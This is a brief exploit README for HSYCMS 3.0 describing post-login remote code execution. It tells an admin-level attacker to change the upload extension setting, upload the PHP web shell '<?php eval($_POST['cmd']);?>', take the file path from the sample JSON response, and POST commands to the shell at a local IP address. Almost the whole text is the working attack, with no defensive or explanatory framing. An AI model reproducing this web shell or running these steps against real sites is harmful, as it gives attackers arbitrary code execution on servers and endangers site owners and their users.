# hsycms3.0-exp

'''
after logged in as admin 
'''

firstly change the config upload_ext



upload php file  <?php eval($_POST['cmd']);?>




get upload path   for example 

{"status":"y","info":"文件上传成功",
"url":"\/upload\/20200408\/e04236222373ddc238d016c390d38cc0.php",
"ext":"php",
"name":"e04236222373ddc238d016c390d38cc0"}



then open http://192.168.0.128:80/upload/20200408/e04236222373ddc238d016c390d38cc0.php and POST cmd to execute code

